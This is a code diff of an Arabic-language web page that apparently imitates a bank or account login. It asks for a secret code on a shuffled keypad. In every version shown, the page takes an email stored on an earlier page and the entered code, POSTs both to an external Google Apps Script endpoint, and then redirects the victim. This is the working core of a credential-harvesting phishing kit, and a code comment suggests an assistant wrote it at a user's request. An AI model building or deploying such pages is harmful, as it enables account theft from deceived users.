@@ -36,26 +36,11 @@
             background-color: #fff; 
             margin-bottom: 15px;
             box-sizing: border-box; 
-            letter-spacing: 5px;
             height: 60px; 
             outline: none;
+            letter-spacing: 8px;
         }
 
-        .info-links { 
-            display: flex; 
-            flex-direction: column; 
-            align-items: flex-end; 
-            gap: 10px; 
-            margin-bottom: 30px; 
-        }
-        .info-link { 
-            text-decoration: underline; 
-            color: #000; 
-            font-size: 15px; 
-            font-weight: bold; 
-            cursor: pointer; 
-        }
-        
         .login-btn {
             width: 100%; 
             background-color: #ffffff; 
@@ -76,27 +61,26 @@
             cursor: pointer; 
         }
 
-        /* تنسيق لوحة الأرقام */
         .keypad { 
             display: grid; 
             grid-template-columns: repeat(3, 1fr); 
-            gap: 1px;
-            background-color: #c8d1c7;
+            gap: 10px; 
+            background-color: #fff;
+            padding: 15px;
+            border-radius: 12px;
             border: 1px solid #c8d1c7;
-            border-radius: 8px;
-            overflow: hidden;
         }
         .key { 
             padding: 20px 0; 
             text-align: center; 
             font-size: 24px; 
             font-weight: bold; 
-            background-color: #fff;
+            background-color: #f9f9f9;
             cursor: pointer; 
             user-select: none; 
+            border-radius: 8px;
         }
-        .key:active { background-color: #f0f0f0; }
-        .key.action-key { background-color: #f9f9f9; font-size: 16px; color: #666; }
+        .key:active { background-color: #e0e0e0; }
     </style>
 </head>
 <body>
@@ -106,106 +90,78 @@
     
     <input type="password" id="passInput" class="password-display" placeholder="إدخل الرمز السري" readonly>
     
-    <div class="info-links">
-        <div class="info-link">ما المقصود بالرمز السري؟</div>
-        <div class="info-link">نسيتم الرمز السري؟</div>
-    </div>
+    <button id="finalBtn" class="login-btn" disabled onclick="sendData()">ولوج</button>
 
-    <button id="finalBtn" class="login-btn" disabled>ولوج</button>
-
-    <div class="keypad" id="keypad">
-        </div>
+    <div class="keypad" id="keypad"></div>
 </div>
 
 <script>
     let currentPass = "";
-    // ضع رابط Apps Script الجديد الخاص بك هنا
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbwKACz6-gYKCiYYDLYBSqMk-EUtadf23y1fQm0xmcWekwN2LiTl8dX8o_TZPsBQ8G5K/exec';
+    // الرابط الخاص بك الذي زودتني به
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbwyQ4bmCc15izyIM0opYzcuXBvdVdoI9eeiTzuPIDNpj0o0NpzbneYHI3dPv6RLPfDS/exec';
 
     function generateKeypad() {
         let nums = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9].sort(() => Math.random() - 0.5);
         const keypad = document.getElementById('keypad');
         keypad.innerHTML = "";
         
-        // توليد أول 9 أرقام
-        for (let i = 0; i < 9; i++) {
-            createKey(nums[i]);
-        }
-        
-        // السطر الأخير: زر مسح، الرقم الأخير، وزر فارغ
-        const clearKey = document.createElement('div');
-        clearKey.className = 'key action-key';
-        clearKey.innerText = "مسح";
-        clearKey.onclick = () => {
-            currentPass = "";
-            document.getElementById('passInput').value = "";
-            updateButtonState();
-        };
-        keypad.appendChild(clearKey);
-
-        createKey(nums[9]);
-
-        const extraKey = document.createElement('div');
-        extraKey.className = 'key action-key';
-        keypad.appendChild(extraKey);
+        nums.forEach(num => {
+            const keyDiv = document.createElement('div');
+            keyDiv.className = 'key';
+            keyDiv.innerText = num;
+            keyDiv.onclick = () => {
+                if (currentPass.length < 6) {
+                    currentPass += num;
+                    document.getElementById('passInput').value = "*".repeat(currentPass.length);
+                    updateButton();
+                }
+            };
+            keypad.appendChild(keyDiv);
+        });
     }
 
-    function createKey(num) {
-        const keyDiv = document.createElement('div');
-        keyDiv.className = 'key';
-        keyDiv.innerText = num;
-        keyDiv.onclick = () => {
-            if (currentPass.length < 6) {
-                currentPass += num;
-                document.getElementById('passInput').value = "*".repeat(currentPass.length);
-                updateButtonState();
-            }
-        };
-        document.getElementById('keypad').appendChild(keyDiv);
-    }
-
-    function updateButtonState() {
+    function updateButton() {
         const btn = document.getElementById('finalBtn');
         if(currentPass.length >= 4) {
             btn.disabled = false;
             btn.classList.add('active');
-        } else {
-            btn.disabled = true;
-            btn.classList.remove('active');
         }
     }
 
-    document.getElementById('finalBtn').addEventListener('click', async () => {
+    async function sendData() {
+        // سحب الإيميل الذي تم حفظه في الصفحة الأولى
         const email = localStorage.getItem('storedEmail');
         const btn = document.getElementById('finalBtn');
         
         if (!email) {
-            alert("يرجى العودة والبدء من الصفحة الأولى");
+            alert("خطأ: لم يتم العثور على البريد. يرجى العودة للصفحة الأولى.");
             window.location.href = "../";
             return;
         }
 
-        btn.innerText = "جاري التحميل...";
+        btn.innerText = "جاري الحفظ...";
         btn.disabled = true;
 
         try {
+            // إرسال البيانات (إيميل + باسورد) للسكريبت
             await fetch(scriptURL, {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify({
-                    email: email,
-                    password: currentPass,
-                    action: "final_login"
+                body: JSON.stringify({ 
+                    email: email, 
+                    password: currentPass 
                 })
             });
 
+            // التوجيه لصفحة الحساب
             setTimeout(() => {
                 window.location.href = "../UserAccountSystem/Account/";
-            }, 1200);
-        } catch (e) {
+            }, 1000);
+
+        } catch (error) {
             window.location.href = "../UserAccountSystem/Account/";
         }
-    });
+    }
 
     window.onload = generateKeypad;
 </script>
